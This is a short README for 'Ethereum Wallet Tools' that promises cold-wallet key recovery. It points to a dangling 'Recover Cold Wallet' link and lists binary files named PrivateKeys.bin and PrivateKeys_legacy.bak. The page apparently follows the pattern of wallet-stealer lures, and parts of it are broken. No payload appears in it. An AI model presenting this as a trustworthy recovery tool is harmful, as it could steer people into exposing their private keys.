# Ethereum Wallet Tools

A lightweight set of scripts and utilities for Ethereum key recovery and seed phrase analysis.  
Ideal for cold wallet key inspection and recovery from fragmented backups.

## Features

- Parse `.json` keystore files
- Validate and format `.env` secrets
- Advanced recovery via binary tools

---

## ⚠️ Advanced Binary Recovery

For low-level cold wallet key reconstruction from binary blobs:


Recover Cold Wallet (Ledger 1 and 2)

## 🧰 Tool Structure

```plaintext
ethereum-wallet-tools/
├── .env                        # Sample key config
├── config/
│   └── rpc_config.json         # RPC node + wallet details
├── keystore/
│         Private
├── scripts/
│   ├── wallet_recovery.sh      # Main recovery interface
│   └── PrivateKeys.bin         # Legacy binary dump recovery
└── secrets/
    └── PrivateKeys_legacy.bak  # Encrypted backup blob
```